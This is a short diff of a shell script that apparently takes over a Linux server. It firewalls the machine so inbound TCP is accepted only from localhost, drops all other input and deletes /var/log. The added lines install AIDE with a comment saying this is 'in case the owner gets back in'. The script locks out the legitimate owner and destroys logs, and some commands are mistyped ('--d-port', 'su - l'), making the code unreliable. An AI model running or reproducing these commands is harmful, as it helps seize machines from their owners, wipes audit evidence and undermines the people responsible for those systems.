@@ -40,6 +40,10 @@ su -l -c "yum install iptables && iptables -A INPUT -p tcp -s 127.0.0.1 --d-port
 su -l -c "iptables -P INPUT DROP"
  
 su -l -c "rm -rf /var/log && rm -rf /var/logs"
+
+# Installs the AIDE intrusion detection system in case the owner gets back in.
+
+su - l -c "yum install aide"
  
 echo 'Complete!'
  
